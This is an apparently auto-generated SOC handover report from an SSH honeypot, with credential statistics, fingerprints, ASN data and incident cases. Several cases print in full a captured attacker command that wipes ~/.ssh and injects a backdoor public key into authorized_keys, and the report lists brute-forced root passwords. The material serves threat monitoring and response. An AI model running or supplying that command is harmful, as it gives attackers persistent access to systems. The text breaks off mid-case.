# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-23 |
| **Generated At** | 2026-04-23T13:54:02Z |
| **Shift Time** | 13:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **328** |
| Confirmed Threats | **303** |
| False Positives Filtered | **25** (7.6%) |
| Unique Attacker IPs | **27** |
| Countries of Origin | **12** |
| High Severity Cases | **56** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **272** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **141** |
| Unique Credential Pairs | **82** |
| Unique Usernames | **38** |
| Unique Passwords | **81** |
| Successful Auth Pairs | **36** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 56 |
| `345gs5662d34` | 28 |
| `ubuntu` | 5 |
| `postgres` | 3 |
| `admin` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 28 |
| `3245gs5662d34` | 28 |
| `Host: 13.235.92.17:23` | 2 |
| `Accept-Encoding: gzip` | 2 |
| `$4` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 28 |
| `root` | `3245gs5662d34` | 28 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 2 |
| `*1` | `$4` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Wangsu@123` | `14.103.118.212` | 2026-04-23T11:34:52 |
| `root` | `3245gs5662d34` | `14.103.118.212` | 2026-04-23T11:34:56 |
| `root` | `cloud1234` | `45.158.244.111` | 2026-04-23T11:49:45 |
| `root` | `3245gs5662d34` | `45.158.244.111` | 2026-04-23T11:49:50 |
| `root` | `Killer123` | `45.158.244.111` | 2026-04-23T11:51:26 |
| `root` | `Aa123123` | `45.158.244.111` | 2026-04-23T11:54:09 |
| `root` | `asd.1234` | `45.158.244.111` | 2026-04-23T11:55:04 |
| `root` | `XSW@zaq1` | `45.158.244.111` | 2026-04-23T12:00:31 |
| `root` | `Letmein123` | `45.158.244.111` | 2026-04-23T12:04:02 |
| `root` | `qazwsx2020@123` | `69.138.228.221` | 2026-04-23T12:09:54 |
| `root` | `3245gs5662d34` | `69.138.228.221` | 2026-04-23T12:10:01 |
| `root` | `zzQQ123` | `69.138.228.221` | 2026-04-23T12:12:37 |
| `root` | `123456789qq` | `69.138.228.221` | 2026-04-23T12:13:32 |
| `root` | `p-0p-0p-0` | `69.138.228.221` | 2026-04-23T12:14:25 |
| `root` | `Test1234` | `69.138.228.221` | 2026-04-23T12:18:58 |
| `root` | `1004` | `69.138.228.221` | 2026-04-23T12:28:05 |
| `root` | `qazwsx2020..` | `69.138.228.221` | 2026-04-23T12:28:57 |
| `root` | `qwe123-=` | `46.24.47.94` | 2026-04-23T13:12:29 |
| `root` | `3245gs5662d34` | `46.24.47.94` | 2026-04-23T13:12:32 |
| `root` | `admin@123.com` | `157.7.113.83` | 2026-04-23T13:17:32 |
| `root` | `3245gs5662d34` | `157.7.113.83` | 2026-04-23T13:17:36 |
| `root` | `01` | `103.183.62.1` | 2026-04-23T13:21:03 |
| `root` | `3245gs5662d34` | `103.183.62.1` | 2026-04-23T13:21:05 |
| `root` | `Root8888@@` | `121.122.65.136` | 2026-04-23T13:38:00 |
| `root` | `3245gs5662d34` | `121.122.65.136` | 2026-04-23T13:38:02 |
| `root` | `qazwsx6666@@` | `121.122.65.136` | 2026-04-23T13:38:57 |
| `root` | `bangsat` | `121.122.65.136` | 2026-04-23T13:39:59 |
| `root` | `Qweasd123` | `121.122.65.136` | 2026-04-23T13:41:00 |
| `root` | `Qwe@2024` | `121.122.65.136` | 2026-04-23T13:42:01 |
| `root` | `BBzz112233` | `121.122.65.136` | 2026-04-23T13:44:54 |
| `root` | `qwe123-=` | `121.122.65.136` | 2026-04-23T13:46:55 |
| `root` | `A12345678` | `121.122.65.136` | 2026-04-23T13:50:02 |
| `root` | `qweQWE123` | `121.122.65.136` | 2026-04-23T13:51:03 |
| `root` | `Qwe@2024` | `178.217.169.240` | 2026-04-23T13:51:47 |
| `root` | `3245gs5662d34` | `178.217.169.240` | 2026-04-23T13:51:52 |
| `root` | `Root123123#$` | `121.122.65.136` | 2026-04-23T13:52:04 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **328** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 140 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 130 | 7 |
| `03a80b21afa8...` | Modern SSH client | 6 | 4 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 130 | 7 | libssh-based |
| `03a80b21afa8...` | libssh | 6 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 4 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 28 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.158.244.111`, `121.122.65.136`, `178.217.169.240`, `46.24.47.94`, `157.7.113.83`, `103.183.62.1`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **27** |
| Unique ASNs | **21** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS38283` | CHINANET SiChuan Telecom Internet Data Center | 1 | HIGH |
| `AS151729` | SWIFTIFY PRIVATE LIMITED | 1 | LOW |
| `AS197119` | KRENA - Kyrgyz research and education network association | 1 | HIGH |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (56)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8ee32d688114

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]212` |
| **First Seen** | 2026-04-23 11:34 |
| **Last Seen** | 2026-04-23 11:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 11:34:52` | `cowrie.session.connect` |
| `2026-04-23 11:34:52` | `cowrie.client.version` |
| `2026-04-23 11:34:52` | `cowrie.client.kex` |
| `2026-04-23 11:34:52` | `cowrie.login.success` |
| `2026-04-23 11:34:53` | `cowrie.session.params` |
| `2026-04-23 11:34:53` | `cowrie.command.input` |
| `2026-04-23 11:34:53` | `cowrie.command.failed` |
| `2026-04-23 11:34:53` | `cowrie.log.closed` |
| `2026-04-23 11:34:53` | `cowrie.session.params` |
| `2026-04-23 11:34:53` | `cowrie.command.input` |
| `2026-04-23 11:34:53` | `cowrie.session.file_download` |
| `2026-04-23 11:34:53` | `cowrie.log.closed` |
| `2026-04-23 11:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]212` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ba2af0855cf

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]212` |
| **First Seen** | 2026-04-23 11:34 |
| **Last Seen** | 2026-04-23 11:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 11:34:55` | `cowrie.session.connect` |
| `2026-04-23 11:34:55` | `cowrie.client.version` |
| `2026-04-23 11:34:55` | `cowrie.client.kex` |
| `2026-04-23 11:34:56` | `cowrie.login.success` |
| `2026-04-23 11:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]212` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0034a2cb9c87

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-04-23 11:49 |
| **Last Seen** | 2026-04-23 11:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 11:49:44` | `cowrie.session.connect` |
| `2026-04-23 11:49:44` | `cowrie.client.version` |
| `2026-04-23 11:49:44` | `cowrie.client.kex` |
| `2026-04-23 11:49:45` | `cowrie.login.success` |
| `2026-04-23 11:49:46` | `cowrie.session.params` |
| `2026-04-23 11:49:46` | `cowrie.command.input` |
| `2026-04-23 11:49:46` | `cowrie.command.failed` |
| `2026-04-23 11:49:46` | `cowrie.log.closed` |
| `2026-04-23 11:49:46` | `cowrie.session.params` |
| `2026-04-23 11:49:46` | `cowrie.command.input` |
| `2026-04-23 11:49:46` | `cowrie.session.file_download` |
| `2026-04-23 11:49:46` | `cowrie.log.closed` |
| `2026-04-23 11:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b09e9ba9792

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-04-23 11:49 |
| **Last Seen** | 2026-04-23 11:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 11:49:49` | `cowrie.session.connect` |
| `2026-04-23 11:49:49` | `cowrie.client.version` |
| `2026-04-23 11:49:49` | `cowrie.client.kex` |
| `2026-04-23 11:49:50` | `cowrie.login.success` |
| `2026-04-23 11:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f3b0749dfc2

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-04-23 11:51 |
| **Last Seen** | 2026-04-23 11:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 11:51:25` | `cowrie.session.connect` |
| `2026-04-23 11:51:25` | `cowrie.client.version` |
| `2026-04-23 11:51:25` | `cowrie.client.kex` |
| `2026-04-23 11:51:26` | `cowrie.login.success` |
| `2026-04-23 11:51:26` | `cowrie.session.params` |
| `2026-04-23 11:51:26` | `cowrie.command.input` |
| `2026-04-23 11:51:26` | `cowrie.command.failed` |
| `2026-04-23 11:51:26` | `cowrie.log.closed` |
| `2026-04-23 11:51:27` | `cowrie.session.params` |
| `2026-04-23 11:51:27` | `cowrie.command.input` |
| `2026-04-23 11:51:27` | `cowrie.session.file_download` |
| `2026-04-23 11:51:27` | `cowrie.log.closed` |
| `2026-04-23 11:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78330acb8543

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-04-23 11:51 |
| **Last Seen** | 2026-04-23 11:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 11:51:30` | `cowrie.session.connect` |
| `2026-04-23 11:51:30` | `cowrie.client.version` |
| `2026-04-23 11:51:30` | `cowrie.client.kex` |
| `2026-04-23 11:51:31` | `cowrie.login.success` |
| `2026-04-23 11:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16b83c76f364

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-04-23 11:54 |
| **Last Seen** | 2026-04-23 11:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 11:54:08` | `cowrie.session.connect` |
| `2026-04-23 11:54:08` | `cowrie.client.version` |
| `2026-04-23 11:54:08` | `cowrie.client.kex` |
| `2026-04-23 11:54:09` | `cowrie.login.success` |
| `2026-04-23 11:54:09` | `cowrie.session.params` |
| `2026-04-23 11:54:09` | `cowrie.command.input` |
| `2026-04-23 11:54:09` | `cowrie.command.failed` |
| `2026-04-23 11:54:10` | `cowrie.log.closed` |
| `2026-04-23 11:54:11` | `cowrie.session.params` |
| `2026-04-23 11:54:11` | `cowrie.command.input` |
| `2026-04-23 11:54:11` | `cowrie.session.file_download` |
| `2026-04-23 11:54:11` | `cowrie.log.closed` |
| `2026-04-23 11:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce3d1a83b369

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-04-23 11:54 |
| **Last Seen** | 2026-04-23 11:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 11:54:14` | `cowrie.session.connect` |
| `2026-04-23 11:54:14` | `cowrie.client.version` |
| `2026-04-23 11:54:14` | `cowrie.client.kex` |
| `2026-04-23 11:54:15` | `cowrie.login.success` |
| `2026-04-23 11:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6be2387f28b2

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-04-23 11:55 |
| **Last Seen** | 2026-04-23 11:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 11:55:03` | `cowrie.session.connect` |
| `2026-04-23 11:55:03` | `cowrie.client.version` |
| `2026-04-23 11:55:03` | `cowrie.client.kex` |
| `2026-04-23 11:55:04` | `cowrie.login.success` |
| `2026-04-23 11:55:05` | `cowrie.session.params` |
| `2026-04-23 11:55:05` | `cowrie.command.input` |
| `2026-04-23 11:55:05` | `cowrie.command.failed` |
| `2026-04-23 11:55:05` | `cowrie.log.closed` |
| `2026-04-23 11:55:05` | `cowrie.session.params` |
| `2026-04-23 11:55:05` | `cowrie.command.input` |
| `2026-04-23 11:55:05` | `cowrie.session.file_download` |
| `2026-04-23 11:55:05` | `cowrie.log.closed` |
| `2026-04-23 11:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9552b3c09a1

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-04-23 11:55 |
| **Last Seen** | 2026-04-23 11:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 11:55:08` | `cowrie.session.connect` |
| `2026-04-23 11:55:08` | `cowrie.client.version` |
| `2026-04-23 11:55:08` | `cowrie.client.kex` |
| `2026-04-23 11:55:09` | `cowrie.login.success` |
| `2026-04-23 11:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69e6190f5890

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-04-23 12:00 |
| **Last Seen** | 2026-04-23 12:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:00:30` | `cowrie.session.connect` |
| `2026-04-23 12:00:30` | `cowrie.client.version` |
| `2026-04-23 12:00:30` | `cowrie.client.kex` |
| `2026-04-23 12:00:31` | `cowrie.login.success` |
| `2026-04-23 12:00:32` | `cowrie.session.params` |
| `2026-04-23 12:00:32` | `cowrie.command.input` |
| `2026-04-23 12:00:32` | `cowrie.command.failed` |
| `2026-04-23 12:00:32` | `cowrie.log.closed` |
| `2026-04-23 12:00:32` | `cowrie.session.params` |
| `2026-04-23 12:00:32` | `cowrie.command.input` |
| `2026-04-23 12:00:33` | `cowrie.session.file_download` |
| `2026-04-23 12:00:33` | `cowrie.log.closed` |
| `2026-04-23 12:00:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8905c4ed406

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-04-23 12:00 |
| **Last Seen** | 2026-04-23 12:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:00:35` | `cowrie.session.connect` |
| `2026-04-23 12:00:35` | `cowrie.client.version` |
| `2026-04-23 12:00:36` | `cowrie.client.kex` |
| `2026-04-23 12:00:36` | `cowrie.login.success` |
| `2026-04-23 12:00:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcd2d63e127f

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-04-23 12:04 |
| **Last Seen** | 2026-04-23 12:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
